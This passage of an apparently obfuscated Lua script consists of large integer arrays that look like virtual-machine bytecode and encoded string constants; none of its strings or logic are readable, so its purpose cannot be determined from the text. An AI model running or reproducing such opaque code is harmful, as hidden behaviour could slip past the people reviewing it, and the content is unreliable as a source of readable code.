10,54},P={},U={{1,45}},nParams=2}}
local _l_I23={12,54,16,116,55,61,53,116,52,30,52,38,54,12,54,16,116,55,61,53,116,53,30,52,38,55,12,54,16,116,55,61,53,116,50,30,52,38,52,12,54,16,116,55,61,53,116,51,30,52,38,53,12,54,16,116,55,61,53,116,48,30,52,38,50,12,54,16,116,55,61,53,116,49,30,52,38,51,12,54,16,116,55,61,53,116,62,30,52,38,48,18,54,116,63,61,38,49,18,49,116,60,61,116,61,39,38,62,116,58,38,63,116,59,38,60,116,56,38,61,40,55,38,58,40,52,38,59,40,53,38,56,40,50,38,57,18,57,30,54,45,55,12,57,116,38,61,40,51,30,55,45,55,1,38,38,116,39,38,39,40,48,38,36,12,57,116,38,61,40,49,30,55,45,55,116,36,116,36,117,116,37,39,16,41,137,45,55,18,62,19,41,200,12,34,116,35,61,116,32,18,63,18,60,18,39,30,50,38,37,18,36,18,39,30,55,45,55,18,52,116,33,61,16,116,46,61,53,40,62,30,52,45,55,18,49,116,47,61,16,116,46,61,53,40,63,30,52,45,55,10,54,20,200,12,44,116,45,61,116,42,61,116,43,61,38,34,12,40,116,41,61,18,34,116,22,9,116,23,116,20,30,53,38,35,40,60,38,32,40,61,38,33,12,21,116,18,61,116,19,116,19,116,19,30,53,38,46,12,21,116,18,61,116,16,116,16,116,16,30,53,38,47,12,21,116,18,61,116,17,116,17,116,17,30,53,38,44,12,21,116,18,61,116,30,116,30,116,30,30,53,38,45,12,21,116,18,61,116,31,116,31,116,31,30,53,38,42,12,21,116,18,61,116,28,116,28,116,28,30,53,38,43,12,21,116,18,61,116,29,116,29,116,29,30,53,38,40,12,21,116,18,61,116,26,116,27,116,27,30,53,38,41,12,21,116,18,61,116,27,116,24,116,25,30,53,38,22,12,21,116,18,61,116,6,116,6,116,6,30,53,38,23,12,21,116,18,61,116,7,116,7,116,7,30,53,38,20,12,21,116,18,61,116,4,116,4,116,4,30,53,38,21,40,58,38,18,40,59,38,19,40,56,38,16,40,57,38,17,40,38,38,30,40,39,38,31,12,5,116,2,61,116,3,30,55,38,28,18,28,116,60,116,0,26,18,28,116,1,44,26,18,28,116,14,12,15,116,14,61,116,12,61,26,18,28,116,13,36,26,18,28,116,10,18,49,16,116,11,61,53,116,8,30,52,26,18,32,116,9,30,55,18,32,116,118,30,55,38,26,38,29,12,5,116,2,61,116,119,30,55,38,27,18,27,116,116,12,117,116,2,61,116,19,18,29,116,19,18,26,30,50,26,18,27,116,114,12,117,116,2,61,116,115,18,29,43,116,112,9,116,115,18,26,43,116,112,9,30,50,26,18,27,116,113,18,46,26,18,27,116,126,116,19,26,18,27,116,127,36,26,18,27,116,124,36,26,18,27,116,125,36,26,18,27,116,10,18,28,26,18,18,18,27,116,122,30,52,45,55,18,19,18,27,116,123,18,42,30,53,45,55,18,32,116,120,30,55,38,24,12,5,116,2,61,116,119,30,55,38,25,18,25,116,116,12,117,116,2,61,116,123,116,19,116,19,18,24,30,50,26,18,25,116,113,18,47,26,18,25,116,126,116,19,26,18,25,116,10,18,27,26,18,17,18,25,116,121,18,49,116,60,61,60,116,102,18,40,12,15,116,103,61,116,100,61,30,51,38,6,18,6,116,116,12,117,116,2,61,116,123,18,32,116,101,30,55,43,116,123,116,19,30,50,26,18,6,116,114,12,117,116,2,61,116,19,18,32,116,98,30,55,116,19,116,19,30,50,26,18,30,18,25,116,99,12,21,116,18,61,116,96,116,97,116,97,30,53,116,98,30,50,38,7,18,7,116,116,49,12,117,116,2,61,116,19,18,32,116,110,30,55,116,19,18,32,116,111,50,55,-1,63,55,26,18,7,116,114,12,117,116,2,61,116,123,18,32,116,108,30,55,43,116,115,18,32,116,102,30,55,43,30,50,26,18,30,18,25,116,109,18,41,116,102,30,50,38,4,18,4,116,116,49,12,117,116,2,61,116,19,18,32,116,111,30,55,116,19,18,32,116,111,50,55,-1,63,55,26,18,4,116,114,12,117,116,2,61,116,123,18,32,116,106,30,55,43,116,115,18,32,116,102,30,55,43,30,50,26,18,4,116,107,61,16,116,46,61,53,40,36,30,52,45,55,18,7,116,107,61,16,116,46,61,53,40,37,30,52,45,55,18,32,116,104,30,55,38,5,12,5,116,2,61,116,119,30,55,38,2,18,2,116,116,12,117,116,2,61,116,123,116,19,116,19,18,5,30,50,26,18,2,116,114,12,117,116,2,61,116,19,116,19,116,19,18,24,30,50,26,18,2,116,113,18,47,26,18,2,116,126,116,19,26,18,2,116,10,18,27,26,12,5,116,2,61,116,119,30,55,38,3,18,3,116,116,12,117,116,2,61,116,123,116,19,116,19,116,123,30,50,26,18,3,116,114,12,117,116,2,61,116,19,116,19,116,123,116,123,43,30,50,26,18,3,116,113,18,42,26,18,3,116,126,116,19,26,18,3,116,10,18,2,26,1,16,116,123,116,52,26,16,116,112,116,105,26,16,116,86,116,87,26,16,116,84,116,85,26,38,0,1,38,1,1,38,14,1,38,15,18,24,18,5,14,38,12,18,26,18,12,54,38,13,18,32,116,16,30,55,38,10,18,32,116,82,30,55,38,11,18,32,116,84,30,55,38,8,40,34,38,9,12,40,116,83,61,18,29,18,0,8,9,30,55,38,118,40,35,38,119,12,80,18,0,50,55,53,38,114,38,117,38,116,118,116,117,114,22,115,22,112,18,116,18,117,18,114,50,52,52,38,112,38,115,18,115,38,114,18,115,11,31,41,1546,18,9,30,54,38,113,18,15,18,112,18,113,26,18,115,116,123,54,18,118,117,38,126,12,5,116,2,61,116,81,30,55,38,127,18,127,116,116,12,117,116,2,61,116,19,18,118,116,19,18,5,30,50,26,18,127,116,114,12,117,116,2,61,116,19,18,126,116,19,116,19,30,50,26,18,127,116,94,116,123,26,18,127,116,126,116,19,26,18,127,116,95,18,112,26,18,127,116,92,18,23,26,18,127,116,93,18,32,116,98,30,55,26,18,127,116,103,12,15,116,103,61,116,100,61,26,18,127,116,90,44,26,18,127,116,10,18,2,26,18,1,18,112,18,127,26,12,5,116,2,61,116,119,30,55,38,124,18,124,116,116,49,12,117,116,2,61,116,19,18,118,18,32,116,91,30,55,54,116,19,18,32,116,112,50,55,-1,63,55,26,18,124,116,114,12,117,116,2,61,116,19,18,126,18,32,116,16,30,55,14,116,123,18,32,116,112,30,55,43,30,50,26,18,124,116,113,18,40,26,18,124,116,126,116,19,26,18,124,116,88,44,26,18,124,116,10,18,2,26,18,14,18,112,18,124,26,18,127,116,107,61,16,116,46,61,53,40,32,30,52,45,55,22,113,22,126,22,127,22,124,20,1329,18,119,116,52,30,55,45,55,18,15,116,52,61,38,125,18,32,116,26,30,55,38,122,18,10,18,122,14,18,10,14,38,123,18,29,18,123,54,18,10,54,38,120,18,17,18,125,116,89,116,70,18,23,12,15,116,103,61,116,100,61,30,51,38,121,18,121,116,116,49,12,117,116,2,61,116,19,18,122,116,19,18,32,116,71,50,55,-1,63,55,26,18,121,116,114,12,117,116,2,61,116,19,18,10,116,19,18,10,30,50,26,12,5,116,2,61,116,68,30,55,38,102,18,102,116,116,12,117,116,2,61,116,19,18,122,116,19,18,13,18,32,116,71,30,55,54,18,10,116,112,117,54,18,32,116,112,30,55,54,30,50,26,18,102,116,114,12,117,116,2,61,116,19,18,10,116,19,18,10,18,32,116,30,30,55,14,30,50,26,18,102,116,113,18,44,26,18,102,116,126,116,19,26,18,102,116,69,18,32,116,112,30,55,26,18,102,116,66,18,23,26,18,102,116,67,12,117,116,2,61,116,19,116,19,116,19,116,19,30,50,26,18,102,116,10,18,125,26,18,18,18,102,116,84,30,52,45,55,18,19,18,102,116,123,18,42,30,53,45,55,12,5,116,2,61,116,64,30,55,38,103,18,103,116,65,12,15,116,65,61,116,78,61,26,18,103,116,79,49,12,76,116,2,61,116,19,18,32,116,112,50,55,-1,63,55,26,18,103,116,10,18,102,26,49,18,16,18,102,18,32,116,86,50,55,-1,63,55,45,55,18,17,18,125,116,77,116,102,18,40,12,15,116,103,61,116,100,61,30,51,38,100,18,100,116,116,49,12,117,116,2,61,116,19,18,120,116,19,18,32,116,71,50,55,-1,63,55,26,18,100,116,114,12,117,116,2,61,116,19,18,123,116,19,18,10,30,50,26,12,5,116,2,61,116,119,30,55,38,101,18,101,116,116,49,12,117,116,2,61,116,19,18,120,116,19,18,32,116,74,50,55,-1,63,55,26,18,101,116,114,12,117,116,2,61,116,19,18,123,116,19,18,10,18,32,116,30,30,55,14,30,50,26,18,101,116,113,18,44,26,18,101,116,126,116,19,26,18,101,116,10,18,125,26,18,18,18,101,116,84,30,52,45,55,18,19,18,101,116,123,18,42,30,53,45,55,49,18,16,18,101,18,32,116,75,50,55,-1,63,55,45,55,18,17,18,101,116,72,116,70,18,20,30,50,38,98,18,98,116,116,12,117,116,2,61,116,123,116,19,116,123,116,19,30,50,26,18,98,116,73,36,26,18,10,18,32,116,30,30,55,14,18,32,116,74,30,55,14,18,10,14,38,99,12,40,116,83,61,18,120,18,10,54,116,112,9,30,55,38,96,40,33,38,97,18,97,116,182,18,45,116,19,30,53,38,110,18,97,116,183,12,21,116,18,61,116,30,116,96,116,30,30,53,116,123,30,53,38,111,18,97,116,180,12,21,116,18,61,116,30,116,181,116,31,30,53,116,112,30,53,38,108,18,97,116,178,12,21,116,18,61,116,179,116,97,116,97,30,53,116,86,30,53,38,109,18,97,116,176,18,41,116,84,30,53,38,106,18,97,116,177,12,21,116,18,61,116,179,116,97,116,179,30,53,116,75,30,53,38,107,18,97,116,190,12,21,116,18,61,116,30,116,30,116,25,30,53,116,122,30,53,38,104,18,97,116,191,12,21,116,18,61,116,97,116,74,116,96,30,53,116,188,30,53,38,105,18,97,116,189,12,21,116,18,61,116,6,116,97,116,27,30,53,116,16,30,53,38,86,18,97,116,186,12,21,116,18,61,116,27,116,30,116,181,30,53,116,70,30,53,38,87,18,97,116,187,12,21,116,18,61,116,25,116,30,116,30,30,53,116,98,36,30,50,38,84,18,97,116,184,12,21,116,18,61,116,96,116,98,116,96,30,53,116,102,36,30,50,38,85,11,38,82,1,38,83,1,38,80,40,46,38,81,18,110,116,107,61,16,116,46,61,53,40,47,30,52,45,55,18,108,116,107,61,16,116,46,61,53,40,44,30,52,45,55,18,109,116,107,61,16,116,46,61,53,40,45,30,52,45,55,18,106,116,107,61,16,116,46,61,53,40,42,30,52,45,55,18,107,116,107,61,16,116,46,61,53,40,43,30,52,45,55,18,104,116,107,61,16,116,46,61,53,40,40,30,52,45,55,18,105,116,107,61,16,116,46,61,53,40,41,30,52,45,55,18,86,116,107,61,16,116,46,61,53,40,22,30,52,45,55,18,87,116,107,61,16,116,46,61,53,40,23,30,52,45,55,18,84,116,107,61,16,116,46,61,53,40,20,30,52,45,55,18,85,116,116,12,117,116,2,61,116,19,18,120,116,19,18,11,30,50,26,18,85,116,114,12,117,116,2,61,116,19,18,123,116,19,18,99,116,102,18,11,18,8,14,117,14,30,50,26,18,85,116,107,61,16,116,46,61,53,40,21,30,52,45,55,18,111,116,107,61,16,116,46,61,53,40,18,30,52,45,55,12,57,116,38,61,40,19,30,55,45,55,18,15,116,105,61,38,94,18,13,18,32,116,71,30,55,54,18,10,116,84,117,54,18,32,116,27,30,55,54,18,32,116,82,30,55,54,18,32,116,106,30,55,54,38,95,18,17,18,94,116,185,116,70,18,23,12,15,116,103,61,116,100,61,30,51,38,92,18,92,116,116,49,12,117,116,2,61,116,123,18,10,43,116,112,117,116,19,18,32,116,91,50,55,-1,63,55,26,18,92,116,114,12,117,116,2,61,116,19,18,10,116,19,18,10,30,50,26,18,31,18,94,116,166,36,30,53,38,93,18,93,116,103,12,15,116,103,61,116,167,61,26,18,93,116,93,18,32,116,102,30,55,26,18,93,116,116,12,117,116,2,61,116,123,18,10,43,116,112,117,116,19,18,95,30,50,26,18,93,116,114,12,117,116,2,61,116,19,18,10,116,19,18,10,18,32,116,71,30,55,14,30,50,26,18,10,18,32,116,71,30,55,14,18,95,14,18,10,14,38,90,18,30,18,94,116,164,18,45,116,102,30,50,38,91,18,91,116,116,49,12,117,116,2,61,116,123,18,10,43,116,112,117,116,19,18,32,116,106,50,55,-1,63,55,26,18,91,116,114,12,117,116,2,61,116,19,18,10,116,19,18,90,30,50,26,18,19,18,91,116,123,18,23,30,53,45,55,1,16,116,123,1,16,116,123,116,165,26,16,116,112,116,162,26,26,16,116,112,1,16,116,123,116,163,26,16,116,112,116,160,26,26,16,116,86,1,16,116,123,116,161,26,16,116,112,116,174,26,26,16,116,84,1,16,116,123,116,175,26,16,116,112,116,172,26,26,16,116,75,1,16,116,123,116,173,26,16,116,112,116,170,26,26,16,116,122,1,16,116,123,116,171,26,16,116,112,116,168,26,26,16,116,188,1,16,116,123,116,169,26,16,116,112,116,150,26,26,38,88,12,5,116,2,61,116,119,30,55,38,89,18,89,116,116,49,12,117,116,2,61,116,123,18,10,43,116,112,117,116,19,18,32,116,151,50,55,-1,63,55,26,18,89,116,114,12,117,116,2,61,116,19,18,10,116,19,18,90,18,32,116,104,30,55,14,30,50,26,18,89,116,94,116,123,26,18,89,116,125,36,26,18,89,116,10,18,94,26,12,5,116,2,61,116,64,30,55,38,70,18,70,116,148,12,15,116,148,61,116,149,61,26,18,70,116,79,49,12,76,116,2,61,116,19,18,32,116,86,50,55,-1,63,55,26,18,70,116,10,18,89,26,12,80,18,88,50,55,53,38,69,38,68,38,71,118,71,68,69,22,66,22,67,18,71,18,68,18,69,50,52,52,38,67,38,66,18,66,38,69,18,66,11,31,41,3425,18,30,18,89,18,67,116,123,61,18,44,116,70,30,50,38,64,18,64,116,92,18,20,26,18,64,116,116,49,12,117,116,2,61,116,19,18,32,116,146,30,55,116,19,18,32,116,30,50,55,-1,63,55,26,18,67,116,112,61,38,65,18,64,116,107,61,16,116,46,61,53,40,16,30,52,45,55,22,64,22,65,20,3295,18,90,18,32,116,104,30,55,14,18,32,116,151,30,55,14,18,10,14,38,78,18,17,18,94,116,147,116,70,18,23,12,15,116,103,61,116,100,61,30,51,38,79,18,79,116,116,49,12,117,116,2,61,116,123,18,10,43,116,112,117,116,19,18,32,116,17,50,55,-1,63,55,26,18,79,116,114,12,117,116,2,61,116,19,18,10,116,19,18,78,30,50,26,18,29,18,10,116,112,117,54,18,32,116,25,30,55,54,18,10,54,38,76,18,31,18,94,116,144,30,52,38,77,18,77,116,116,12,117,116,2,61,116,19,18,76,116,19,18,11,30,50,26,18,77,116,114,12,117,116,2,61,116,19,18,10,116,19,18,78,18,32,116,91,30,55,14,30,50,26,18,30,18,94,116,145,18,45,116,98,30,50,38,74,18,74,116,116,12,117,116,2,61,116,19,18,32,116,158,30,55,116,19,18,11,30,50,26,18,74,116,114,12,117,116,2,61,116,19,18,10,18,76,14,18,10,14,116,19,18,78,18,32,116,91,30,55,14,30,50,26,40,17,38,75,18,91,116,107,61,16,116,46,61,53,40,30,30,52,45,55,18,74,116,107,61,16,116,46,61,53,40,31,30,52,45,55,18,77,116,159,61,16,116,46,61,53,40,28,30,52,45,55,18,15,116,87,61,38,72,18,10,38,73,40,29,38,182,40,26,38,183,18,182,18,72,116,156,18,73,30,53,45,55,18,73,18,32,116,91,30,55,14,38,73,18,31,18,72,116,157,30,52,38,180,18,180,116,116,12,117,116,2,61,116,19,18,29,18,10,116,112,117,54,18,32,116,179,30,55,54,18,10,54,116,19,18,11,30,50,26,18,180,116,114,12,117,116,2,61,116,19,18,10,116,19,18,73,30,50,26,18,30,18,72,116,145,18,45,116,98,30,50,38,181,18,181,116,116,12,117,116,2,61,116,19,18,32,116,154,30,55,116,19,18,11,30,50,26,18,181,116,114,12,117,116,2,61,116,19,18,29,18,10,54,18,32,116,154,30,55,54,116,19,18,73,30,50,26,18,19,18,181,116,123,18,23,30,53,45,55,18,181,116,107,61,16,116,46,61,53,40,27,30,52,45,55,18,73,18,11,14,18,10,116,112,117,14,38,73,18,182,18,72,116,155,18,73,30,53,45,55,18,73,18,32,116,91,30,55,14,38,73,12,5,116,2,61,116,119,30,55,38,178,18,178,116,116,49,12,117,116,2,61,116,123,18,10,43,116,112,117,116,19,18,32,116,152,50,55,-1,63,55,26,18,178,116,114,12,117,116,2,61,116,19,18,10,116,19,18,73,30,50,26,18,178,116,113,18,44,26,18,178,116,126,116,19,26,18,178,116,10,18,72,26,18,18,18,178,116,84,30,52,45,55,18,19,18,178,116,123,18,42,30,53,45,55,49,18,16,18,178,18,32,116,75,50,55,-1,63,55,45,55,18,17,18,178,116,153,116,98,18,20,30,50,38,179,18,179,116,116,12,117,116,2,61,116,123,116,19,116,123,116,19,30,50,26,18,179,116,73,36,26,18,73,18,32,116,152,30,55,14,18,8,14,38,73,18,183,116,134,18,45,18,10,18,73,18,29,18,10,116,112,117,54,30,51,38,176,18,176,116,107,61,16,116,46,61,53,40,24,30,52,45,55,18,73,18,11,14,18,10,116,112,117,14,38,73,18,182,18,72,116,135,18,73,30,53,45,55,18,73,18,32,116,91,30,55,14,38,73,12,40,116,83,61,18,29,18,10,116,86,117,54,116,112,9,30,55,38,177,18,183,116,132,12,21,116,18,61,116,179,116,97,116,97,30,53,18,10,18,73,18,177,30,51,38,190,18,183,116,133,18,41,18,10,18,177,14,18,10,14,18,73,18,177,30,51,38,191,18,183,116,130,12,21,116,18,61,116,25,116,30,116,30,30,53,18,10,18,73,18,11,14,18,8,14,18,29,18,10,116,112,117,54,30,51,38,188,18,190,116,107,61,16,116,46,61,53,40,25,30,52,45,55,18,191,116,107,61,16,116,46,61,53,40,6,30,52,45,55,18,188,116,107,61,16,116,46,61,53,40,7,30,52,45,55,18,73,18,11,14,18,8,14,18,11,14,18,10,116,112,117,14,38,73,18,182,18,72,116,131,18,73,30,53,45,55,18,73,18,32,116,91,30,55,14,38,73,12,40,116,83,61,18,29,18,10,116,86,117,54,116,112,9,30,55,38,189,18,183,116,128,18,45,18,10,18,73,18,189,30,51,38,186,18,183,116,129,18,45,18,10,18,189,14,18,10,14,18,73,18,189,30,51,38,187,18,183,116,142,18,45,18,10,18,73,18,11,14,18,8,14,18,189,30,51,38,184,18,183,116,143,18,45,18,10,18,189,14,18,10,14,18,73,18,11,14,18,8,14,18,189,30,51,38,185,44,38,166,18,186,116,107,61,16,116,46,61,53,40,4,30,52,45,55,44,38,167,11,38,164,18,187,116,107,61,16,116,46,61,53,40,5,30,52,45,55,18,184,116,107,61,16,116,46,61,53,40,2,30,52,45,55,18,185,116,107,61,16,116,46,61,53,40,3,30,52,45,55,18,15,116,85,61,38,165,12,5,116,2,61,116,119,30,55,38,162,18,162,116,116,49,12,117,116,2,61,116,123,116,19,116,19,18,32,116,27,50,55,-1,63,55,26,18,162,116,113,18,47,26,18,162,116,126,116,19,26,18,162,116,10,18,165,26,18,17,18,162,116,140,116,70,18,23,12,15,116,103,61,116,100,61,30,51,116,116,12,117,116,2,61,116,19,18,32,116,96,30,55,116,123,116,19,30,50,26,1,38,163,1,16,116,123,116,141,26,16,116,112,116,138,26,16,116,86,116,139,26,16,116,84,116,136,26,38,160,12,80,18,160,50,55,53,38,175,38,174,38,161,118,161,174,175,22,172,22,173,18,161,18,174,18,175,50,52,52,38,173,38,172,18,172,38,175,18,172,11,31,41,4804,18,30,18,162,18,173,18,44,116,70,30,50,38,170,18,170,116,116,49,12,117,116,2,61,116,19,18,32,116,120,30,55,116,19,18,32,116,30,50,55,-1,63,55,26,18,170,116,114,12,117,116,2,61,116,123,18,32,116,74,30,55,116,75,18,172,54,117,43,18,10,54,116,115,18,32,116,98,30,55,43,30,50,26,18,163,18,173,18,170,26,22,170,20,4687,12,5,116,2,61,116,68,30,55,38,171,18,171,116,116,12,117,116,2,61,116,123,116,19,116,19,18,13,18,32,116,27,30,55,54,30,50,26,18,171,116,114,49,12,117,116,2,61,116,19,116,19,116,19,18,32,116,27,50,55,-1,63,55,26,18,171,116,113,18,46,26,18,171,116,126,116,19,26,18,171,116,69,18,32,116,112,30,55,26,18,171,116,66,18,23,26,18,171,116,67,12,117,116,2,61,116,19,116,19,116,19,116,19,30,50,26,18,171,116,10,18,165,26,49,18,16,18,171,18,32,116,86,50,55,-1,63,55,45,55,12,5,116,2,61,116,64,30,55,38,168,18,168,116,65,12,15,116,65,61,116,78,61,26,18,168,116,79,49,12,76,116,2,61,116,19,18,32,116,123,50,55,-1,63,55,26,18,168,116,10,18,171,26,1,38,169,116,19,38,150,116,141,38,151,40,0,38,148,40,1,38,149,40,14,38,146,12,137,116,246,18,146,26,18,163,116,141,61,116,107,61,16,116,46,61,53,40,15,30,52,45,55,18,163,116,138,61,116,107,61,16,116,46,61,53,40,12,30,52,45,55,18,163,116,139,61,116,107,61,16,116,46,61,53,40,13,30,52,45,55,18,163,116,136,61,116,107,61,16,116,46,61,53,40,10,30,52,45,55,18,48,116,247,61,16,116,46,61,53,40,11,30,52,45,55,18,146,116,244,116,245,116,242,18,63,60,30,53,45,55,18,146,116,244,116,245,116,243,12,240,18,49,116,241,61,30,55,60,30,53,45,55,18,53,116,254,61,16,116,46,61,53,40,8,30,52,45,55,10,54}
local __I_22={{126,205,82,183},{93,200,52,128,3,139,250,118,209,32},{75,194,32,173,2,136,254},{84,219,54,165,59,158,252,87,221,36,191},{73,213,47,179,25,147,253,86,230,45,169,24,104,247,66},{75,194,33,165,35,147,224,86,194,26,185,29,116,252,75,222},{77,199,43,139,14,140,231,77,212,47},{115,199,39,171,24,154,224,98,205,34},{109,219,32,137,8,114,229,79,218,41},{110,218,43,186,2,81,248,70,195,40,146},{109,215,36,185},{102,251,5,133,47,69,196,124,245,27,210,68,57,170,30},{77,204,63,174,2,62,184,5,206,53,128,4,108,232,2,178,39,135,31,123,194,64,174,53,131,173,117,150,91,245,113,135,245,54,217,95,184,8,128,235,100,158,34,166,25},{66,208,59,190,25,100,170,25,142},1.5,{92,218,61,138},{90,204,46,149,27},{30,140,99,215,66,56,170,31,242,96},12,144,{94,180,33,143,23,107},{72,174,38,138,27,121},{67,173,54,137,23,46,243,113,139,27,180,189,49,131,74,238,127,158,234,123,202,82,241,47,178,211,32,146,102,165,75,220,227,77,214,41,183,78,64,193,110,254,112,194,86,117,187,38,211,61,134,25,103,190,89,183,106,141,28,125,198,12,142,57,155,209,112,218,77,167,2,145,175,56,229,52,167,22,170,233,109,196,44,187,14,220,184,46,219,37,190,17,111,182,69,204,114,133,20,101,254,20,134,49,147,41,104,210,69,175,58,137,87,48,245,84,170,39,148,246,100,136,20,254,47,153,234,125,195,18,185,9,130,235,83,190,43,181,14,97,255,6,213,63,226,21,100,245,78,132,22,129,3,89,248,66,181,63,138,25,39,128,121,167,60,189,228,102,209,83,174,5,209,175,19,192,80,177,4,148,171,120,196,42,180,30,148,255,77,150,59,244,0,43,181,65,221,110,146,13,105,186,76,174,55,198,10,117,241,28,183,61,154,11,116,215,67,234,41,152,230,120,137,78,170,22,128,250,117,142,50,173,9,212,255,69,194,51,188,31,139,186,74,145,107,187,29,119,242,67,219,112,139,2,125,236,112,176,48,153,14,107,210,64,231,46,133,229,125,134,75,169,43,135,247,118,139,86,165,16,135,213,111,213,50,163,12,143,251,10,218,97,251,11,109,231,66,211,43,192,1,99,232,89,218,33,145,88,127,246,84,170,119,152,24,100,214,68,167,124,157,231,100,221,94,189,21,220,232,51,141,37,189,2,217,233,113,214,79,180,4,157,240,72,151,44,168,30,96,226,64,211,33,194,5,32,235,79,181,60,203,30,36,128,67,165,56,128,19,58,215,20,176,11,131,232,42,248,120,156,34,175,167,50,223,35,161,0,215,195,68,192,47,181,9,61,177,118,246,31,139,80,41,208,78,223,53,129,5,121,160,75,152,116,170,19,97,214,80,166,47,195,213,109,215,95,239,61,206,164,120,220,79,190,12,155,234,106,216,43,185,69,151,227,76,216,107,161,67,64,250,76,194,115,137,7,61,208,126,143,29,163,23,111,240,86,160,112,143,87,108,141,23,175,51,148,137,122,198,95,174,14,213,253,114,202,124,160,8,137,249,82,218,40,190,68,147,226,11,237,56,187,3,77,243,3,183,60,144,88,68,249,92,177,52,143,30,65,212,64,253,25,130,238,125,195,90,184,119,148,240,118,200,74,184,11,153,162,112,195,36,250,4,136,166,40,217,39,184,15,109,180,87,200,40,221,81,118,235,69,209,38,199,114,98,248,17,169,35,215,64,85,205,67,164,114,162,231,102,219,90,169,4,160,254,106,200,110,158,3,138,255,126,213,32,143,10,140,255,77,217,45,253,4,107,243,71,156,63,144,16,53,185,89,160,38,137,88,7,197,95,181,60,133,25,50,200,76,246,99,180,234,98,199,19,157,6,133,250,125,200,39,129,17,139,235,15,249,34,169,30,97,244,67,252,62,173,29,119,184,95,214,52,138,87,122,239,85,254,116,140,14,125,205,71,234,123,139,239,112,173,78,172,19,152,168,106,220,94,165,11,208,237,107,223,39,163,3,146,254,11,159,67,172,71,32,186,91,222,32,133,86,43,225,89,161,33,129,28,120,202,91,161,101,170,43,88,224,27,169,50,148,230,43,139,99,144,46,186,207,68,241,99,250,73,146,254,26,249,21,150,34,186,252,70,215,47,187,89,127,226,67,217,109,150,31,109,176,65,163,56,141,70,98,209,26,137,59,128,229,63,214,75,169,98,130,247,125,135,83,162,3,202,254,114,195,55,164,0,146,232,10,216,59,188,71,124,189,11,219,41,141,26,104,210,73,198,111,174,61,82,227,24,206,50,132,25,57,169,83,167,56,198,136,97,201,72,165,79,135,247,123,218,46,251,0,140,226,124,198,44,183,5,214,184,4,192,34,180,28,102,182,93,221,60,137,91,127,250,71,181,124,214,84,56,137,19,162,54,204,15,58,135,23,185,59,150,237,100,222,88,162,65,218,242,105,198,38,232,29,146,234,13,218,38,183,8,61,255,86,151,2,190,31,96,180,91,210,48,135,18,67,249,13,183,57,154,8,125,203,91,175,115,137,224,121,194,20,157,12,146,229,124,229,91,251,73,146,228,124,248,32,234,13,156,253,70,152,3,179,13,75,241,85,146,110,132,26,99,186,72,174,55,207,115,120,254,65,174,118,152,14,112,211,89,226,59,133,237,117,221,85,160,12,221,161,59,217,41,189,11,159,173,84,210,53,178,66,136,243,76,204,99,239,95,49,190,10,217,63,233,26,102,255,78,174,117,135,16,34,211,81,180,103,157,227,114,202,85,228,45,222,254,77,217,82,236,54,178,198,92,233,109,248,75,211,255,77,217,36,244,76,47,186,82,211,41,204,62,99,237,68,208,54,216,90,76,219,101,230,42,195,119,121,197,22,166,55,207,227,123,204,27,188,4,135,167,123,195,36,243,20,156,255,49,240,42,188,18,222,229,76,210,36,215,28,108,245,72,208,111,141,30,58,183,74,252,36,132,27,97,204,27,174,42,194,53,65,234,118,143,59,146,235,115,207,17,184,16,218,251,121,220,108,151,7,159,247,8,190,46,188,77,111,248,20,153,45,177,22,37,252,11,223,63,128,87,126,228,64,166,126,141,82,108,205,81,173,114,211,188,54,212,78,191,9,157,225,59,140,94,188,1,216,168,122,159,39,184,14,152,174,19,150,61,180,10,108,159,68,212,45,128,24,39,252,67,253,63,137,24,104,236,70,183,49,133,25,57,192,25,169,50,148,230,63,137,85,169,66,147,230,59,218,41,177,9,218,249,65,192,45,247,31,143,243,82,214,99,174,18,101,251,70,145,54,141,95,41,249,65,166,95,141,21,106,171,81,169,62,231,229,125,194,25,169,49,150,172,18,219,22,243,75,133,239,122,217,48,162,12,142,173,14,206,61,178,10,60,225,78,222,97,142,18,107,252,17,211,34,203,54,106,243,84,232,39,134,28,115,198,127,173,97,155,237,102,220,73,167,15,147,175,125,204,45,182,72,169,224,126,209,32,145,15,215,189,78,216,40,148,20,62,241,72,209,42,204,63,103,249,103,165,41,206,112},{124,172,53,136,16,95,206,84,177,62,156,192,102,213,83,187,5,151,192,107,195,82,134,0,148,238,110,222,54,163},{114,171,57,132,24,115,215},{125,171,12,142,18,116,212,88,184,41},{68,169,43,135,12,98,196,91,174},{119,178,40,159,229,125,210,122,173,50,151,247,121},{99,161,62,153,241,123,213,78,158,9,137,227},{110},{90,171,41,152},{91,167,63,156,244},1280,0.6,1.4,{127,160,14,154,250,40},{91,162,12,155,219,91,237},0,8,14,20,35,200,255,180,30,160,70,90,150,220,{5,177,1,113,249,69,221,52},{35,133,4},{29,130,6,98,255,67,135,38,143},{13,166,42,73,255,67,168,58},{2,134,5,108,232,96,172,6,152,26,121,207},{11,173,25,110,248,72,129,51,129,29,121,203,90,186},{23,139,13,102},{0,143,27,96,246,92,162},{29,128,20,98,210,86,129,44,133,54,124,214,93,191},{5,137,9,107,207,64},{1,136,21,123,228,90,186,24,134,232,120,195},{7,134,28,105,198,68,142,41,134},620,560,{28,159,225,126,195},{8,135,251,113},{9,171,235,120,154},{13,159,240,127,221,85,160,12},0.5,2,{34,146,229,114,203,77,189,16,150,239,93,222,40,184,24,206},{35,155,245,126,200,50,128,15,131,233,79,219,61,189,7},{35,150,252,114,216,36},{39,132,232,123,200,35,183,4,158},{39,155,227,109,195,7,179,26,159,234,76,209,41,181,26,114},6,1,36,{42,186,205,106,240,8,149,63,32,179,228,14,108,255},11,{44,146,254,87},{44,145,229,76,214,39,159,31,111,242},120,10,{59,79,216,104,251,9},60,15,65,22,96,{150,155,15},28,{59,102,233,92,167,23,157,15,122,206,90,246,25,129,233,112,205},32,{61,115,251,82,177,35,143},3,{46,98,207,95,181},4,{51,122,214,69,189,47},26,{24,125,203,88,184},{22,98,196,81,185,45},{212,118,222,77,142,42,134,241,119,197},{195,117,196,81,170,18,156,243,119,200,107,160,4,150,248,110,208,54,178,4,158,233},{214,112,208,79},{215,115,209,72,140,13,153,231,105,157},{208,114,210,73,131,10,140,236},{196,109,223,81,147,17,131,254,114,222,0,185,5,147,253},16,{209,115,222,41,177,10,156},{203,84,224,15,145,36,174,200,100,147,102,233},9,18,{216,125,195,43,187,6,148,254,68,240,59,189,2,103},{223,124,192,42,180,7,188,240,86,227,34,180,19,104,248,76,207,60},{222,67,193,41,181,0,189,243,87,241,38,191,22,97,212,69,209,63,145,69},{205,64,218,49,187,30,83,250,92,220},{218,107,249,33,168,26,77,245,94,213,56,148},{195,76,196,61,147,29,102,240,90},{221,69,206,37,168,4,76,228,77,217,61},{194,68,220,47,183,31,99},{198,